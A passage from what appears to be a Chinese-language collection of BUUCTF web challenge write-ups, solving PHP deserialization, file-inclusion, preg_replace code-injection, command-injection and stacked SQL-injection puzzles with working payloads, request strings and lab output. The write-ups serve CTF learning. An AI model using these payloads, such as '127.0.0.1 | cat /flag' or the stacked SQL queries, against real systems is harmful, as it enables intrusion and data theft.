$chen->input=&$chen->correct;
$chen = serialize($chen);
echo $chen."<br />";
//O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```

访问`http://453330ed-2554-4984-8840-0b67be1cca69.node4.buuoj.cn:81/?pleaseget=1`并用`Hackbar`来提交`POST`数据`pleasepost=2&md51=s878926199a&md52=s155964671a&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}`，从而得到`flag{da006ff2-25a4-42d3-9735-ce27b5ad4dfc}`。

![](https://paper.tanyaodan.com/BUUCTF/buu_code_review/1.png)

------

### [Zer0pts2020]Can you guess it?

进入靶机后，可以看到Source超链接，点进去就是代码审计：

```php+HTML
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

其中，一种解题路径是：

```php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}
```

`$_SERVER['PHP_SELF']`是一个超全局变量，它在 PHP 中用于获取当前正在执行脚本的文件名。

`basename()`函数会返回路径中的文件名部分，但是它会去掉文件名开头的非ASCII值！对此，我们能用不可显字符绕过`basename()`函数的过滤（即后面加 %80 – %ff 的任意字符）。

访问靶机的`/index.php/config.php/%ff?source`即可得到`flag`。

> <?php
> define('FLAG', 'flag{c289fab8-1ef4-4088-8f2e-ce61568cf458}');

------

### [ZJCTF 2019]NiZhuanSiWei

进入靶机后直接就是代码审计：

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

需要用`GET`请求传递三个参数，`text`，`file`和`password`。

首先，我们由`if`判断条件`file_get_contents($text,'r')==="welcome to the zjctf"`可知第一个参数`text=data://text/plain,welcome to the zjctf`。传递该值后看到 welcome to the zjctf。

如果存在过滤的话可以绕过，`text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`。

接着看第二个判断条件`preg_match("/flag/",$file)`。我们无法直接读取`flag`，它的注释中还提示了`userless.php`。针对`php`文件，我们无法直接使用`file=useless.php`查看源码内容，需要`base64`编码再解码后才能读取源码内容。

通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。所以我们可以用`file=php://filter/read=convert.base64-encode/resource=useless.php`来获取加密后的源码。

```
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。

```php
C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo='));"
string(278) "<?php

class Flag{  //flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
?>
"
```

第三个参数`password`涉及到的关键代码部分如下，很明显考察`PHP`反序列化的知识。

```php
$password = $_GET["password"];
include($file);  //useless.php源码如下
class Flag{      //flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
$password = unserialize($password);
echo $password;
```

对`password`进行反序列化，得到`O:4:"Flag":1:{s:4:"file";s:10:"./flag.php";}`。

```php
<?php 
class Flag{  //flag.php  
 public $file;  
 public function __tostring(){  
 if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
 return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}
$a=new Flag();
$a->file=('./flag.php');
echo serialize($a);
?>
// O:4:"Flag":1:{s:4:"file";s:10:"./flag.php";}
```

构造以下参数，访问后查看源码得到`flag`。

```
/?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:10:"./flag.php";}
```

或者可以用以下代码，传入`filter`的伪协议，将`flag.php`的源码以`base64`编码的形式读取出来，得到`O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}`，这也可以是第三个参数`password`的值。

```php
<?php

class Flag{  //flag.php  
    public $file="php://filter/read=convert.base64-encode/resource=flag.php";    
}
$a = new Flag();
$b = serialize($a);
echo $b;
?>
// ?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}
```

访问页面看到信息：

> ### welcome to the zjctf
>
> oh u find it
>
> U R SO CLOSE !///COME ON PLZ

查看源码发现存在注释和一个`if`条件永不为真的`php`代码块。

```php+HTML
<!--but i cant give it to u now-->
<?php
if(2===3){  
	return ("flag{2123b1d0-cfd2-4466-81ce-74b99858cbd5}");
}
?>
```

------

### [BJDCTF2020]ZJCTF，不过如此

打开靶机后，发现这是道`PHP`代码审计与漏洞利用题。需要用`GET`请求方式传递`text`和`file`两个参数。

```php
<?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }
    include($file);  //next.php
}
else{
    highlight_file(__FILE__);
}
?>
```

我们可以利用`file_get_contents`函数支持的伪协议（如`data://`或`php://filter`），构造`payload`绕过条件。

由第一个`if`语句的判断条件`file_get_contents($text,'r')==="I have a dream"`可知，第一个参数是`text=data://text/plain,I have a dream`。传递该值后看到 I have a dream。

第二个参数`file`涉及到的关键代码如下：

```php
if(preg_match("/flag/",$file)){
    die("Not now!");
}
include($file);  //next.php
```

由判断条件`preg_match("/flag/",$file)`可知，文件路径无法包含`flag`，它的注释中还提示了`next.php`。针对`php`文件，我们无法直接使用`file=next.php`查看源码内容，需要`base64`编码再解码后才能读取源码内容。

通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。所以我们可以用`file=php://filter/read=convert.base64-encode/resource=next.php`来获取加密后的源码。

第二个参数就是`file=php://filter/read=convert.base64-encode/resource=next.php`。

构造`payload`向靶机发送`GET`请求。

```
?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

可以看到靶机信息如下：

> ### I have a dream
>
> PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到`next.php`源码信息。

```php
C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K'));"
string(300) "<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
    @eval($_GET['cmd']);
}
"
```

‌分析`next.php`中的漏洞‌：

- `preg_replace`函数使用了`/e`修饰符（此漏洞在PHP 7.0+中已移除），`/e`修饰符结合`strtolower("\\1")`可实现代码注入，会将替换字符串当作`PHP`代码执行。‌‌
- 正则表达式`/(' . $re . ')/ei`中，`$re`来自`GET`参数，`strtolower("\\1")`中的`\\1`表示引用第一个捕获组。当传入的参数匹配正则时，会执行`strtolower`函数，并将捕获组内容作为代码执行。‌
- 通过`foreach`循环遍历GET参数，利用非标准参数名（如`\S*`）构造参数触发漏洞。‌
- `getFlag()`函数包含`@eval($_GET['cmd'])`，是典型的代码执行后门。

构造`payload`：`?id=1&\S*={${getFlag()}}&cmd=system("ls /");`。发送`GET`请求后，靶机会将其解析为一个数组。

```php
$_GET = [
'id'  => '1',
'\S*' => '{${getFlag()}}',
'cmd' => 'system("ls /");'
];
```

进入`foreach`循环时，`'id' => '1'` 找不到匹配项，返回原字符“1”。`\S*` 表示"匹配0个或多个非空白字符"，所以会匹配整个字符串`{${getFlag()}}`，即`'\S*' => '{${getFlag()}}'`，所以就会变成 `strtolower("{${getFlag()}}")`。而又因为`/e`修饰符 ，程序运行时会先执行里面的`${getFlag()}`，然后执行传递参数`cmd=system('ls /')`，返回结果再执行`strtolower()`将返回结果字符串转为小写。

构造完整的`payload`执行`ls /`。

```
?text=data://text/plain,I%20have%20a%20dream&file=next.php&id=1&\S*={${getFlag()}}&cmd=system("ls%20/");
```

可以看到靶机信息如下：

> ### I have a dream
>
> data://text/plain,I have a dream next.php 1 bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var system("ls /");

接着构造完整的`payload`执行`cat /flag`。

```
?text=data://text/plain,I%20have%20a%20dream&file=next.php&id=1&\S*={${getFlag()}}&cmd=system("cat%20/flag");
```

可以看到靶机信息如下：

> ### I have a dream
>
> data://text/plain,I have a dream next.php 1 flag{2a3ecf46-b131-4b17-9938-13360d37b486} system("cat /flag");

提交`flag{2a3ecf46-b131-4b17-9938-13360d37b486}`即可。

------

### [[ACTF2020 新生赛]BackupFile](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]BackupFile)

用`dirsearch`扫描靶机发现有个名为`index.php.bak`的文件，下载后用`Sublime Text`打开代码审计：

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

`is_numeric()`函数限制了`GET`请求传入的`key`只能是数字。在`PHP`中`==`是弱类型比较，比如数字与字符串比较时，会将字符串里的数字传换成`int`，用这部分去比较，所以我们只需传入`key=123`即可得到`flag{994014a0-3bb5-4bbf-a69b-ac087e72ee59}`。

------

### [[第一章 web入门]常见的搜集](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86)

`dirsearch`扫描靶机，发现有3个文件：`robots.txt`，`index.php~`，`./index.php.swp`

名为`robots.txt`的文件，访问后看到如下信息：

```php
User-agent: *
Disallow:
/flag1_is_her3_fun.txt
```

访问`flag1_is_her3_fun.txt`得到`flag1:n1book{info_1`。此外还有一个名为`index.php~`的文件，访问后得到`flag2:s_v3ry_im`。

下载`./index.php.swp`后在`Kali Linux`系统的`Terminal`输入`vim -r index.php.swp`即可看到源代码中有`flag3:p0rtant_hack}`。

提交`n1book{info_1s_v3ry_imp0rtant_hack}`即可。

------

### HTTP

进入靶机后看到：

> Please `GET` me your `name`,I will tell you more things.

靶机`?name=Dad`

> Hello,Dad. Please `POST` me the `key` Again.But Where is the key?

可以在源码中看到<!--Key: ctfisgood-->，`Harkbar`构造`POST`请求，添加`key=ctfisgood`。

> You are smart but you are not `admin`.

`Burpsuite Pro`抓包，修改`Cookie`中的`guest`为`admin`，`send Repeater`以下内容：

```
POST /?name=flag HTTP/1.1
Host: 6059b011-9e32-43f1-8a4d-41a07b7bed8d.node4.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=admin
Connection: close
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

key=ctfisgood
```

可以在`Response`中看到以下信息：

```
HTTP/1.1 200 OK
Server: openresty
Date: Sat, 24 Sep 2022 04:09:24 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 74
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.15

<h1>OK, this is you want: flag{e695e63d-0489-4708-8695-730e7966731b}
</h1>
```

提交`flag{e695e63d-0489-4708-8695-730e7966731b}`即可。

------

### Head?Header!

进入靶机后看到：

> Must Use `CTF` Brower!

`Harkbar`添加`Request header`，`Name`为`User-Agent`，`Value`为`CTF`，勾选刷新页面。

> Must From `ctf.com`

`Harkbar`添加`Request header`，`Name`为`Referer`，`Value`为`ctf.com`，勾选刷新页面。

> Only Local User Can Get Flag

`Harkbar`添加`Request header`，`Name`为`X-Forwarded-For`，`Value`为`127.0.0.1`，勾选刷新页面。

> You Are Good,This is your flag: flag{af1b7bd5-ae50-4b7f-85f1-790ffc7f244a}

提交`flag{af1b7bd5-ae50-4b7f-85f1-790ffc7f244a}`即可。

------

### 我真的会谢

进入靶机后看到：

> **Flag has three part, qsdz hid them in different files.**
> **By the way, these files are sensitive.**

查看源码发现注释<!--I used VIM to write this file, but some errors occurred midway.--> 根据注释想到`vim`非正常退出的话会留下`swp`文件，访问靶机`/.index.php.swp`，可以下载该文件。`vim -r index.php.swp`可以看到以下内容：

```php
<?php
echo "<br><h1<flag has three part, qsdz hid them in different files.By the way, these files are sensitive.</h1><!--I used VIM to write this file, but some errors occurred midway.-->";
#This is my secret
$Part_two = "0_e4sy_d0_y00";
```

还有两段`flag`未知，`dirsearch`扫描靶机目录，发现`robots.txt`和`www.zip`。访问靶机`/robots.txt`，可以看到：

> Part One: flag{Th1s_Is_s00

访问靶机`/www.zip`，解压缩可得文件`secret`，内容如下：

> Part Three: u_th1nk_so?}

将三部分拼接可得`flag{Th1s_Is_s000_e4sy_d0_y00u_th1nk_so?}`，提交即可。

------

### NotPHP

访问靶机，内容如下：

```php+HTML
<?php
error_reporting(0);
highlight_file(__FILE__);
if(file_get_contents($_GET['data']) == "Welcome to CTF"){
    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){
        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){
            echo "Hack Me";
            eval("#".$_GET['cmd']);
        }else{
            die("Number error!");
        }
    }else{
        die("Wrong Key!");
    }
}else{
    die("Pass it!");
} Pass it!
```

代码审计可知`GET`请求传递的`data`值等于`"Welcome to CTF"`。直接赋值失败，`base64`编码可得`V2VsY29tZSB0byBDVEY=`，可以通过伪协议构造`"Welcome to CTF"`，访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=`，看到`Wrong Key!`说明已经绕过了`file_get_contents($_GET['data']) == "Welcome to CTF"`这个判断条件。

第二个判断条件，`key1`和`key2`的值不相等，但是`md5()`加密后的值相等，强类型比较可以传递数组绕过`key1[]=1&key2[]=6`。访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&key1[]=1&key2[]=6`，看到`Number error!`说明已绕过第二层。

接着看第三个判断条件有两个函数`is_numeric()`和`intval()`，其中`is_numeric()`用来判断是否为纯数字，若有字符则为假。`intval()`用于获取变量的整数值。所以`POST`请求传递`num`的值为`2077s`即可绕过，看到`Hack Me`。执行`cmd=system('cat /flag');`失败，这是因为`eval("#".$_GET['cmd']);`有个`#`号，需要闭合才能执行后面的变量。

访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&key1[]=1&key2[]=6&cmd=?><?=system('cat /flag');`，得到`flag{7964f17b-08ce-4a70-9402-941354e8ac26}`。

------

### Word-For-You

题目描述如下：

> 赛博顶针先生悄悄把flag告诉了Mr.H，Mr.H为了确保安全把flag放到了数据库中，你能找到吗？

这题考察点应该是`SQL`注入，`1'or 1=1#`拿下`flag{Th1s_is_0_simp1e_S0L_test}`。

------

### [极客大挑战 2019]EasySQL

这题考察点是`SQL`注入，`1' or '1'='1 `拿下`flag{00c8a93c-61fe-4226-a3f6-9f9585dd3544}`。

```
1' and 1=1#    // NO,Wrong username password！！！
1' or '1'='1   // Login Success!
```

------

### [HCTF 2018]WarmUp

打开靶机看到滑稽，`view-source`查看源码发现关键注释<!--source.php-->，`source.php`源码如下：

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];  // 白名单
            if (! isset($page) || !is_string($page)) {     // 检查$page参数不是空值或者不是字符串
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }
			// 获取$page中从0开始到mb_strpos($page . '?', '?')结束的字符串
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')   // 获取$page?中首次查找到'?'字符的位置,返回int类型
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
			// url解码后再截取$page中从0开始到首次出现的?之前的字符串
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
	// 首先判断file参数是不是空值，再判断file是不是字符串，最后将file传入checkFile类中再进行判断
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

访问`hint.php`看到以下信息：

```
flag not here, and flag in ffffllllaaaagggg
```

`?file=source.php?../../../../../../ffffllllaaaagggg`得到`flag{2cd377e0-3ff6-439b-bc18-f36c038d3457}`。

------

### [极客大挑战 2019]Havefun

一起来撸猫，`view-source`查看源码发现注释：

```php+HTML
<!--
$cat=$_GET['cat'];
echo $cat;
if($cat=='dog'){
	echo 'Syc{cat_cat_cat_cat}';
}
-->
```

`?cat=dog`得到`flag{11b14848-5cda-42e9-bbe2-35b5f0f7f30f}`。

------

### [ACTF2020 新生赛]Exec

尝试输入`127.0.0.1 | ls /`，好家伙！

```
bin
dev
etc
flag
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

`127.0.0.1 | cat /flag`得到`flag{5e8d40da-4393-4d5a-bd44-5abf8c009e58}`。

------

### [强网杯 2019]随便注

打开靶机后看到题目描述：

> 取材于某次真实环境渗透，只说一句话：开发和安全缺一不可

`1' or 1=1 #`初步判定存在SQL注入。

```php
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}

array(2) {
  [0]=>
  string(6) "114514"
  [1]=>
  string(2) "ys"
}
```

`1' order by 1 #`测试字段数，到`3`时报错，说明字段数为`2`。

```bash
1' order by 3 #
error 1054 : Unknown column '3' in 'order clause'
```

通过`;`号堆叠注入多条SQL语句。`1'; show databases; #`查看数据库：

```php
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}
```

`1'; show tables; #`查看当前数据库中所有表的名称：

```php
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

`1'; show columns from words; #`当表名为数字时，要用反引号把表名包起来查询，发现`flag`字段。

```php
1'; show columns from `1919810931114514`; #

array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

`select`字段被过滤啦，可以使用`handler`来读取`1919810931114514`字段中的数据，得到`flag`。

```sql
1'; handler `1919810931114514` open as `a`; handler `a` read next;#

array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(42) "flag{9f29b114-59f6-4548-bd9e-4e4f50ba67ae}"
}
```

或者可以先将`select`语句进行十六进制编码，再通过构造`payload`进而得到`flag`。

```python
>>> "select * from `1919810931114514`".encode().hex()
'73656c656374202a2066726f6d20603139313938313039333131313435313460'
```

- `SELECT`可以在一条语句里对多个变量同时赋值,而`SET`只能一次对一个变量赋值。
- `prepare…from…`是预处理语句，会进行编码转换。
- `execute`用来执行由`SQLPrepare`创建的SQL语句。

```php
1';SET@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#

array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

array(1) {
  [0]=>
  string(42) "flag{9f29b114-59f6-4548-bd9e-4e4f50ba67ae}"
}
```

此外还有第三种解法：

- 先通过 `rename` 把 `words` 表改名为其他的表名。
- 把`1919810931114514`表的名字改为`words`。
- 给新`words`表添加新的唯一标识列名`id` 。**auto_increment**自动赋值，默认从1开始。
- 将`flag`改名为`data` 。

```php
1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#

array(2) {
  [0]=>
  string(42) "flag{9f29b114-59f6-4548-bd9e-4e4f50ba67ae}"
  [1]=>
  string(1) "1"
}
```

------

### [SUCTF 2019]EasySQL

堆叠注入，`1; show databases;`查看数据库：

```
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
```

`1;show tables;`查看当前数据库中所有表的名称：

```
Array ( [0] => 1 ) Array ( [0] => Flag )
```

`1;select * from Flag;` 回显`nonono`，被过滤啦。补充系统变量`@sql_mode`，`sql_mode`是一组`mysql`支持的基本语法及校验规则。`PIPES_AS_CONCAT`：将`||`视为字符串的连接操作符,而非或运算符。

`1;set sql_mode=PIPES_AS_CONCAT;select 1`得到`flag{349eefe9-8887-4732-bf27-381fe6e857b8}`。

```
Array ( [0] => 1 ) Array ( [0] => 1flag{349eefe9-8887-4732-bf27-381fe6e857b8} )
```

------

### [极客大挑战 2019]Secret File

`view-source`查看源码发现`./action.php`。

```html
<!DOCTYPE html>
<html>
<style type="text/css" >
#master	{
    position:absolute;
    left:44%;
    bottom:20;
    text-align :center;
    	}
        p,h1 {
                cursor: default;
        }
</style>
	<head>
		<meta charset="utf-8">
		<title>绝密档案</title>
	</head>
	<body style="background-color:black;"><br><br><br><br><br><br>
		<h1 style="font-family:verdana;color:red;text-align:center;">
		我把他们都放在这里了，去看看吧		<br>
		</h1><br><br><br><br><br><br>
		<a id="master" href="./action.php" style="background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;">
			<font size=6>SECRET</font>
		</a>
	<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
	</body>
</html>
```

访问`/action.php`，点击`SECRET`，很快就重定向到`/end.php`啦。

```html
<!DOCTYPE html>
<html>
<style>
        p,h1 {
                cursor: default;
        }
</style>
	<head>
		<meta charset="utf-8">
		<title>END</title>
	</head>
	<body style="background-color:black;"><br><br><br><br><br><br>
		<h1 style="font-family:verdana;color:red;text-align:center;">查阅结束</h1><br><br><br>	
		<p style="font-family:arial;color:red;font-size:20px;text-align:center;">没看清么？回去再仔细看看吧。</p>
		<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
	</body>
</html>
```

用`Burp Suite pro`抓包，`Send to Repeater`，`Send`得到：

```html
HTTP/1.1 302 Found
Server: openresty
Date: Tue, 22 Nov 2022 09:46:35 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: end.php
X-Powered-By: PHP/7.3.11
Content-Length: 63

<!DOCTYPE html>
<html>
<!--
   secr3t.php
-->
</html>
```

访问`/secr3t.php`得到：

```php+HTML
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

使用文件包含代码查看`flag.php`，`/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php`：

```
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ODUzNDIxZjktYWFiNy00Zjk4LWE3N2UtMGRkMDNlMWU3ODc0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgP